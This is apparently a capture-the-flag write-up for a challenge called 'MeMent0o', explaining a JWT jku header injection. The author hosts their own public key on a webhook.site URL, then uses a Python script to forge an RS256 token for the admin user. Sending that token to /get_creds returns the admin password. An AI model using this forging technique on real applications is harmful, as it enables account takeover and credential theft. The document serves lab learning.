## MeMent0o

After registering a new user on the site, we get a jwt toke. Copying it onto jwt.io we can see this

![image](https://github.com/user-attachments/assets/76e5b34e-41b0-43ee-8436-f8a9b58d2e94)

The JWT verifiction code:

![image](https://github.com/user-attachments/assets/e779381e-b7bb-495f-9c92-596fe15a8445)

![image](https://github.com/user-attachments/assets/a1fd2f4d-12ad-4264-a1f6-af7cf0c0b11a)

So the app is sending request to what the jku header is set to andretrieving the public key from it.
Hence we can create a new keypair of private and public keys, craft a JWT token with username: admin , set the jku 
header to http://mywebsite/jku where im placing my public key over there and then sign the JWT using my private key. 

To bypass kid verifications: Use a copy of their function app.go/jwks() with my public key to create the jku url content. 

script to create;
```
import jwt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

# load private key from keypair.pem
with open("keypair.pem", "rb") as key_file:
    private_key = serialization.load_pem_private_key(key_file.read(),password=None,backend=default_backend())

payload = {
    "username": "admin"
}

headers = {
    "alg": "RS256",                        									# Algorithm for signing
    "typ": "JWT",                          									# Type of the token
    "jku": "https://webhook.site/4a0469d3-0f24-4ec4-a756-0d554f1064f7",  	# JSON Web Key Set URL
    "kid": "001122334455"                  									# Key ID
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print("JWT Token:", token)
```

after sending this JWT to /get_creds we recieve the user credentials so we have the admin password
